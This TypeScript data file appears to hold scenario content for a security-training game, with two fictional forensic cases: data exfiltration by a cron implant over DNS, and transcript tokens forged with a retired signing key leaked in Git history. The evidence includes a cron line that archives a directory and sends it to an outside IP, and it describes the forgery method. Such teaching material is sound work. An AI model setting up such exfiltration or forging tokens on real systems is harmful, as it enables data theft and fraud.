export interface CaseEvidence {
  type: string;
  title: string;
  detail: string;
}

export interface CaseSuspect {
  name: string;
  role: string;
  note: string;
}

export interface InvestigationCase {
  id: string;
  title: string;
  subtitle: string;
  category: string;
  duration: number;
  icon:
    | 'scan'
    | 'mail'
    | 'database'
    | 'fingerprint'
    | 'shield'
    | 'code'
    | 'globe'
    | 'footprints'
    | 'key'
    | 'sun';
  color: 'cyan' | 'emerald' | 'amber' | 'indigo' | 'violet' | 'rose';
  briefing: string;
  incident: string;
  evidence: CaseEvidence[];
  suspects: CaseSuspect[];
  timeline: string[];
  hints: string[];
}

export const cases: InvestigationCase[] = [
  {
    id: 'shadow-trace',
    title: 'Shadow Trace',
    subtitle: 'Silent Exfiltration from Lab Node 14',
    category: 'Network & Endpoint Forensics',
    duration: 20,
    icon: 'footprints',
    color: 'cyan',
    briefing:
      'At 02:18 UTC, an automated data-staging archive appeared on Robotics Lab workstation WS-14, followed by steady outbound traffic to an unknown relay. SSH audit logs show zero interactive logins during the overnight window.',
    incident: 'Simulated endpoint telemetry, cron scheduling, and DNS resolver investigation.',
    evidence: [
      {
        type: 'CRON AUDIT',
        title: 'Scheduled User Job (/var/spool/cron/labsvc)',
        detail:
          '02:15 UTC — Daily hidden entry: 15 2 * * * /tmp/.cache-sync --archive /srv/lab/designs --dest 198.51.100.72:443 (created 3 days prior by UID 1042).',
      },
      {
        type: 'DNS LOG',
        title: 'Internal Resolver Query Burst',
        detail:
          '02:19:04 UTC — 640 unique TXT queries to *.telemetry-mirror.example from WS-14 containing hex-encoded chunks while direct HTTP was blocked by proxy.',
      },
      {
        type: 'AUTH LOG',
        title: 'SSH & PAM Session History',
        detail:
          'No interactive SSH sessions recorded between 20:00 and 06:00 UTC. Last valid console unlock: 17:42 UTC by research intern Devon Brooks.',
      },
      {
        type: 'WORKSTATION',
        title: 'USB Mass Storage Mount Event',
        detail:
          '3 days earlier at 18:05 UTC — Unregistered USB drive (VID_0781) mounted for 42 seconds on WS-14 while terminal was left unlocked; /tmp/.cache-sync written immediately after.',
      },
      {
        type: 'FIREWALL',
        title: 'VLAN Perimeter Summary',
        detail:
          'Routine campus nightly backup completed at 01:00 UTC over internal fiber link 10.12.0.5 with normal checksum.',
      },
    ],
    suspects: [
      {
        name: 'Devon Brooks',
        role: 'Lab Research Intern',
        note: 'Left workstation WS-14 unlocked briefly at 18:02 three days ago while grabbing coffee in the hall.',
      },
      {
        name: '.cache-sync Cron Implant',
        role: 'Scheduled Persistence Binary',
        note: 'Dropped from an unregistered USB drive and scheduled to archive and tunnel data at 02:15 UTC.',
      },
      {
        name: 'telemetry-mirror.example',
        role: 'External DNS Relay',
        note: 'Received 640 hex-encoded TXT queries after the 02:18 archive staging completed.',
      },
    ],
    timeline: [
      'WS-14 begins tunneling hex chunks via DNS queries at 02:19 UTC',
      'Unregistered USB drive mounts for 42 seconds and writes /tmp/.cache-sync',
      'Cron triggers /tmp/.cache-sync to stage /srv/lab/designs at 02:15 UTC',
      'Nightly campus backup finishes cleanly at 01:00 UTC',
    ],
    hints: [
      'Look back 3 days before the overnight alert: how did /tmp/.cache-sync arrive on WS-14?',
      'Notice why no SSH login appears at 02:15 UTC—the job ran from cron persistence.',
      'Separate the routine 01:00 UTC campus backup from the malicious 02:15–02:19 UTC activity.',
    ],
  },
  {
    id: 'encrypted-truth',
    title: 'Encrypted Truth',
    subtitle: 'The After-Hours Signing Key',
    category: 'Cryptography & Key Forensics',
    duration: 25,
    icon: 'key',
    color: 'indigo',
    briefing:
      'The Registrar flagged 18 digitally signed transcript verification tokens issued at 03:40 UTC. Every signature validates cleanly against the university’s public JWKS, yet the hardware security room shows zero badge entries overnight.',
    incident: 'Simulated key lifecycle audit, Git object history, and signature verification trace.',
    evidence: [
      {
        type: 'JWKS REGISTRY',
        title: 'Active Public Key Endpoint',
        detail:
          '{"keys":[{"kid":"reg-2026","alg":"RS256","status":"active"},{"kid":"reg-2023","alg":"RS256","status":"retired"}]} — Both keys remain trusted by the verifier.',
      },
      {
        type: 'GIT HISTORY',
        title: 'Commit Object c81e4a (Archived Repo)',
        detail:
          'A developer accidentally committed signing_backup_2023.pem in 2023 and removed it in the next commit—never scrubbing Git history or revoking kid="reg-2023".',
      },
      {
        type: 'TOKEN HEADER',
        title: 'Flagged Transcript Token Sample',
        detail:
          '{"alg":"RS256","kid":"reg-2023","typ":"JWT"} | Payload: {"issuedAt":"2026-11-17T03:40:12Z","honors":"SUMMA"} — Accepted by validator despite retired status.',
      },
      {
        type: 'HSM TELEMETRY',
        title: 'Hardware Module Signing Counter',
        detail:
          'Primary reg-2026 HSM key signed 0 tokens between 22:00 and 06:00 UTC. Physical vault door remained sealed.',
      },
      {
        type: 'API ACCESS',
        title: 'Public Verification Portal Traffic',
        detail:
          '03:42 UTC — 18 verification requests from residential IP 203.0.113.94 testing the forged tokens against /api/verify.',
      },
    ],
    suspects: [
      {
        name: 'reg-2023 Backup Key',
        role: 'Leaked Git History Secret',
        note: 'Exposed in archived commit c81e4a; deleting the file later did not erase Git history.',
      },
      {
        name: 'Transcript Validator',
        role: 'Permissive Verification Service',
        note: 'Honored any kid listed in JWKS without checking status:"retired" or issuance window.',
      },
      {
        name: '203.0.113.94 Client',
        role: 'External Token Tester',
        note: 'Submitted the 18 forged reg-2023 tokens to /api/verify at 03:42 UTC.',
      },
    ],
    timeline: [
      'Forged tokens signed with reg-2023 pass /api/verify at 03:42 UTC',
      'Developer deletes signing_backup_2023.pem in follow-up commit without revoking key',
      'Backup private key committed to repository in commit c81e4a',
      'Validator retains retired reg-2023 in public JWKS without status enforcement',
    ],
    hints: [
      'Check which key ID (kid) signed the 03:40 UTC tokens—was it reg-2026 or reg-2023?',
      'Deleting a PEM file in a newer Git commit does not remove it from earlier commit objects.',
      'Notice the HSM counter confirms the active reg-2026 key was never touched overnight.',
    ],
  },
];
